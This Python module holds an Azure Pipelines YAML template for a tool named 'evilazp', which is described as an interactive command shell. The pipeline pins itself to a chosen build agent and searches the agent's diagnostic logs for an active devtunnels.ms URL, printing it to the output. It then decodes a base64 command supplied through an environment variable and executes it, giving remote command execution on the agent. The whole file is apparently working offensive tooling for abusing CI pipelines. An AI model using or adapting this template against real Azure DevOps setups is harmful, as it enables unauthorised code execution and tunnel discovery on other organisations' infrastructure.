"""Azure Pipelines YAML template used by the interactive command shell."""

from __future__ import annotations

AZURE_PIPELINE_YAML = r"""trigger: none
pr: none

pool:
  name: $(targetPool)
  demands:
  - Agent.Name -equals $(targetAgent)

steps:
- checkout: none

- powershell: |
    $ErrorActionPreference = "Continue"
    $runId = $env:EVILAZP_RUN_ID
    $commandB64 = $env:EVILAZP_COMMAND_B64
    try {
      $diagRoot = if ($env:AGENT_HOMEDIRECTORY) {
        Join-Path $env:AGENT_HOMEDIRECTORY "_diag"
      } else {
        Join-Path (Get-Location) "_diag"
      }
      if (Test-Path -LiteralPath $diagRoot) {
        $tunnelLine = Get-ChildItem -LiteralPath $diagRoot -Filter "*.log" -ErrorAction SilentlyContinue |
          Sort-Object LastWriteTimeUtc -Descending |
          Select-Object -First 20 |
          ForEach-Object {
            Select-String -LiteralPath $_.FullName -Pattern "Tunnel active" -SimpleMatch -ErrorAction SilentlyContinue |
              Select-Object -Last 1
          } |
          Select-Object -First 1
        if ($tunnelLine -and ($tunnelLine.Line -match 'https://[A-Za-z0-9.-]+\.devtunnels\.ms[^\s]*')) {
          Write-Host "::EVILAZP_TUNNEL::$($Matches[0])"
        }
      }
    } catch {
    }
    Write-Host "::EVILAZP_START::$runId"
    try {
      $bytes = [Convert]::FromBase64String($commandB64)
      $command = [Text.Encoding]::UTF8.GetString($bytes)
      $scriptBlock = [ScriptBlock]::Create($command)
      $global:LASTEXITCODE = $null
      & $scriptBlock *>&1
      $success = $?
      $nativeExitCode = $LASTEXITCODE
      if ($null -ne $nativeExitCode) {
        $exitCode = [int]$nativeExitCode
      } elseif ($success) {
        $exitCode = 0
      } else {
        $exitCode = 1
      }
    } catch {
      Write-Error $_
      $exitCode = 1
    }
    Write-Host "::EVILAZP_END::$runId::EXIT::$exitCode"
    exit $exitCode
  displayName: "evilazp command"
  env:
    EVILAZP_RUN_ID: $(runId)
    EVILAZP_COMMAND_B64: $(commandB64)
"""


def render_pipeline_yaml() -> str:
    """Return the static pipeline template."""

    return AZURE_PIPELINE_YAML
